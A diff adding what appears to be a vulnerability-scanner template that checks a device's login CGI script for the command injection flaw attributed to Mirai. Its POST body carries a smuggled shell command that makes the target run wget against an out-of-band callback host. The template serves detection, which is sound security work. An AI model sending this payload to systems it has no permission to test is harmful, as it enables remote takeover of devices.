@@ -1,0 +1,24 @@
+id: mirai-unknown-rce
+brief:
+    title: Mirai - Remote Command Injection
+    by: gy741
+    level: critical
+    about: Mirai is susceptible to an unknown exploit that targets the login CGI script, where a key parameter is not properly sanitized leading to a command injection vulnerability.
+    label:
+        - mirai
+        - rce
+        - oast
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: POST
+      to:
+        - '{{BaseURL}}/cgi-bin/login.cgi'
+      head:
+        Content-Type: application/x-www-form-urlencoded
+      body: key=';`wget http://{{interactsh-url}}`;#
+      signs:
+        - "on": word
+          has:
+            - http
+          in: interactsh_protocol
